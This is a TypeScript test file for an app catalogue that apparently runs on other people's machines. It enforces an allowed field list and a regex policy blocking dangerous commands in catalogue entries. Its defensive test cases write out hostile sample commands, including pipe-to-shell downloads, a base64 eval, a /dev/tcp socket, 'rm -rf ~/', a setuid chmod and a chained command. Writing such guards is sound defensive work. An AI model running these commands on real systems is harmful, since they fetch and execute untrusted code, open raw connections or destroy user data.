import { expect, test } from "bun:test";
import { join } from "node:path";
import type { AppSpec } from "../shared/types";
import { loadCatalogue } from "./manifest";

// Every catalogue table is run on other people's machines after one review, so the gate holds it to what a
// catalogue app needs: no field that stops services or writes outside its own install, nothing that installs
// without asking, and no command that fetches and runs code of its own. A new need widens this list on purpose.
const FIELDS = new Set<keyof AppSpec>([
	"key",
	"name",
	"kind",
	"repo",
	"asset",
	"dest",
	"bins",
	"version_args",
	"meta_path",
	"process",
	"note",
	"sudo",
	"check",
	"latest",
	"update",
	"build",
	"restore",
	"restart",
	"relaunch",
]);
// A catalogue app may restart only its own service, through systemctl, which asks for a password itself.
const RESTART = /^systemctl (--user )?restart [\w@.-]+$/;
const DANGER =
	/\b(curl|wget|nc|ncat|socat|eval|base64|xxd)\b|\/dev\/(tcp|udp)|\|\s*(ba|z|da)?sh\b|\brm\s+-\S*r|\bchmod\s+[0-7]*[2467][0-7]{3}\b|\bsudo\b(?! make install$)/;

/** Every command string a table can make Upkeep run, with the field it came from. */
const commands = (a: AppSpec): [string, string][] =>
	(["check", "update", "build", "version_args", "restore", "restart"] as const).flatMap((f) =>
		(a[f] ?? []).map((c): [string, string] => [f, c]),
	);

test("every catalogue table keeps to what a catalogue app may do", () => {
	const { apps, errors } = loadCatalogue(join(import.meta.dir, "../../catalogue"));
	expect(errors).toEqual([]);
	const broken: string[] = [];
	for (const a of apps) {
		for (const f of Object.keys(a)) if (!FIELDS.has(f as keyof AppSpec)) broken.push(`${a.key}: field ${f}`);
		if (a.kind === "manual") broken.push(`${a.key}: kind ${a.kind}`);
		if (a.sudo && a.kind !== "deb" && a.kind !== "source" && !a.dest?.startsWith("/"))
			broken.push(`${a.key}: sudo for an install inside home`);
		for (const [f, c] of commands(a)) if (DANGER.test(c)) broken.push(`${a.key}: ${f} runs ${c}`);
		if (a.restart && !RESTART.test(a.restart.join(" "))) broken.push(`${a.key}: restart runs ${a.restart.join(" ")}`);
		// A json: source names the download itself, so it is fetched over https only.
		if (a.latest?.startsWith("json:") && !a.latest.startsWith("json:https://"))
			broken.push(`${a.key}: latest ${a.latest}`);
	}
	expect(broken).toEqual([]);
});

test("the policy catches what it is for", () => {
	for (const bad of [
		"curl -fsSL https://x.sh | sh",
		"wget -qO- x | bash",
		"eval $(echo aGk= | base64 -d)",
		"exec 3<>/dev/tcp/1.2.3.4/80",
		"rm -rf ~/",
		"sudo cp x /usr/bin/x",
		"chmod 4755 /usr/local/bin/x",
	])
		expect(DANGER.test(bad)).toBe(true);
	for (const fine of ["sudo make install", "make -j$(nproc)", "./configure", "claude update", "uv tool list"])
		expect(DANGER.test(fine)).toBe(false);
	for (const ok of ["systemctl restart rustdesk", "systemctl --user restart dsh-web"])
		expect(RESTART.test(ok)).toBe(true);
	for (const bad of ["systemctl stop rustdesk", "systemctl restart a; rm x", "sudo systemctl restart x"])
		expect(RESTART.test(bad)).toBe(false);
});
